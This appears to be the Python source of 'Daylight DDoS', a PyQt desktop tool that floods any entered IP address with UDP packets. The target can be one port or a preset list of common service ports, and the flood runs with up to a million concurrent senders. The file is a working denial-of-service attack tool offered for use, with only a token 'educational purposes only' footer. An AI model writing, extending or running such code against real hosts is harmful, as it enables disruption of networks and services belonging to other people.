try:
    import win32gui
except ImportError:
    print("pywin32 is required. Install it using 'pip install pywin32'.")
    sys.exit()


def check_other_instances(title):
    def enum_windows(hwnd, param):
        if win32gui.IsWindowVisible(hwnd) and title in win32gui.GetWindowText(hwnd):
            param.append(hwnd)

    window_list = []
    win32gui.EnumWindows(enum_windows, window_list)
    return len(window_list) > 0


class KogekiThread(QThread):
    def __init__(self, target_ip, target_ports, thread_count):
        super().__init__()
        self.target_ip = target_ip
        self.target_ports = target_ports
        self.thread_count = thread_count
        self.running = True

    def run(self):
        asyncio.run(self.flood())

    async def flood(self):
        async def send_packet(port):
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    payload = b"\x02\x04\x08\x10\x20\x40\x80" * 10
                    sock.sendto(payload, (self.target_ip, port))
                except Exception:
                    pass
                finally:
                    sock.close()

        tasks = []
        for port in self.target_ports:
            tasks.extend([send_packet(port) for _ in range(self.thread_count)])

        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass

    def stop(self):
        self.running = False


class UDPFlooderApp(QMainWindow):
    icon_base64 = """
    
    """

    def __init__(self):
        super().__init__()
        self.setWindowTitle("☠ Daylight DDoS ☠ 1.2.4")
        self.setFixedSize(500, 400)
        self.setWindowIcon(self.load_icon())

        self.default_ports = [21, 22, 23, 25, 53, 80, 110, 123, 143, 443, 993, 995]
        self.running = False
        self.attack_thread = None

        self.setStyleSheet("""
            QMainWindow {
                background-color: #1E1E2F;
            }
            QLabel {
                color: white;
                font-size: 14px;
            }
            QLabel#footer {
                color: orange;
                font-size: 12px;
            }
            QLabel#warning {
                color: lightblue;
                font-size: 12px;
                padding-top: 5px;
            }
            QLineEdit, QSpinBox, QPushButton {
                background-color: #2E2E3E;
                border: 1px solid #5E5E7E;
                color: white;
                padding: 5px;
                font-size: 14px;
            }
            QLineEdit:hover, QSpinBox:hover, QPushButton:hover {
                border-color: #9E9EDE;
            }
        """)

        central_widget = QWidget()
        layout = QVBoxLayout()

        ip_layout = QHBoxLayout()
        ip_label = QLabel("IP Address:")
        self.ip_input = QLineEdit()
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.ip_input)
        layout.addLayout(ip_layout)

        self.run_my_ip_toggle = QCheckBox("Run on My IP")
        self.run_my_ip_toggle.setStyleSheet("color: white;")
        self.run_my_ip_toggle.stateChanged.connect(self.toggle_my_ip_mode)
        layout.addWidget(self.run_my_ip_toggle)

        self.run_local_toggle = QCheckBox("Run on Local Machine")
        self.run_local_toggle.setStyleSheet("color: white;")
        self.run_local_toggle.stateChanged.connect(self.toggle_local_mode)
        layout.addWidget(self.run_local_toggle)

        self.run_all_ports_toggle = QCheckBox("Run on All Ports")
        self.run_all_ports_toggle.setStyleSheet("color: white;")
        self.run_all_ports_toggle.stateChanged.connect(self.toggle_all_ports_mode)
        layout.addWidget(self.run_all_ports_toggle)

        port_layout = QHBoxLayout()
        port_label = QLabel("Port:")
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(80)
        port_layout.addWidget(port_label)
        port_layout.addWidget(self.port_input)
        layout.addLayout(port_layout)

        thread_layout = QHBoxLayout()
        thread_label = QLabel("Threads:")
        self.thread_input = QSpinBox()
        self.thread_input.setRange(1, 1000000)
        self.thread_input.setValue(5000)
        thread_layout.addWidget(thread_label)
        thread_layout.addWidget(self.thread_input)
        layout.addLayout(thread_layout)

        self.toggle_button = QPushButton("Start")
        self.toggle_button.setStyleSheet("background-color: green; color: white;")
        self.toggle_button.clicked.connect(self.toggle_attack)
        layout.addWidget(self.toggle_button)

        warning_label = QLabel("created by con.\nuse responsibly.\n")
        warning_label.setObjectName("warning")
        warning_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(warning_label)

        footer = QLabel("⚠ this tool is for educational purposes only　⚠")
        footer.setObjectName("footer")
        footer.setAlignment(Qt.AlignCenter)
        layout.addWidget(footer)

        central_widget.setLayout(layout)
        self.setCentralWidget(central_widget)

    def load_icon(self):
        pixmap = QPixmap()
        pixmap.loadFromData(base64.b64decode(self.icon_base64))
        return QIcon(pixmap)

    def toggle_my_ip_mode(self, state):
        if state == Qt.Checked:
            self.run_local_toggle.setChecked(False)
            self.ip_input.setEnabled(False)
            self.ip_input.setStyleSheet("background-color: gray; color: lightgray;")
            self.fetch_public_ip()
        else:
            self.ip_input.setEnabled(True)
            self.ip_input.setStyleSheet("background-color: #2E2E3E; color: white;")

    def fetch_public_ip(self):
        try:
            result = subprocess.run(["curl", "-s", "https://api.ipify.org"], capture_output=True, text=True)
            public_ip = result.stdout.strip()
            if public_ip:
                self.ip_input.setText(public_ip)
            else:
                self.ip_input.setText("Error fetching public IP")
        except Exception:
            self.ip_input.setText("Error fetching public IP")

    def toggle_local_mode(self, state):
        if state == Qt.Checked:
            self.run_my_ip_toggle.setChecked(False)
            self.ip_input.setText("127.0.0.1")
            self.ip_input.setEnabled(False)
            self.ip_input.setStyleSheet("background-color: gray; color: lightgray;")
        else:
            self.ip_input.setEnabled(True)
            self.ip_input.setStyleSheet("background-color: #2E2E3E; color: white;")

    def toggle_all_ports_mode(self, state):
        if state == Qt.Checked:
            self.port_input.setEnabled(False)
            self.port_input.setStyleSheet("background-color: gray; color: lightgray;")
        else:
            self.port_input.setEnabled(True)
            self.port_input.setStyleSheet("background-color: #2E2E3E; color: white;")

    def toggle_attack(self):
        if not self.running:
            target_ip = self.ip_input.text().strip()
            if not target_ip:
                return
            self.start_attack(target_ip)
        else:
            self.stop_attack()

    def start_attack(self, target_ip):
        self.running = True
        self.toggle_button.setText("Running...")
        self.toggle_button.setStyleSheet("background-color: red; color: white;")

        if self.run_all_ports_toggle.isChecked():
            target_ports = self.default_ports
        else:
            target_ports = [self.port_input.value()]

        thread_count = self.thread_input.value()
        self.attack_thread = KogekiThread(target_ip, target_ports, thread_count)
        self.attack_thread.start()

    def stop_attack(self):
        self.running = False
        self.toggle_button.setText("Start")
        self.toggle_button.setStyleSheet("background-color: green; color: white;")
        if self.attack_thread:
            self.attack_thread.stop()
            self.attack_thread.wait()
            self.attack_thread = None


if __name__ == "__main__":
    app_title = "☠ Daylight DDoS ☠ 1.2.4"
    if check_other_instances(app_title):
        sys.exit()

    app = QApplication(sys.argv)
    window = UDPFlooderApp()
    window.show()
    sys.exit(app.exec_())
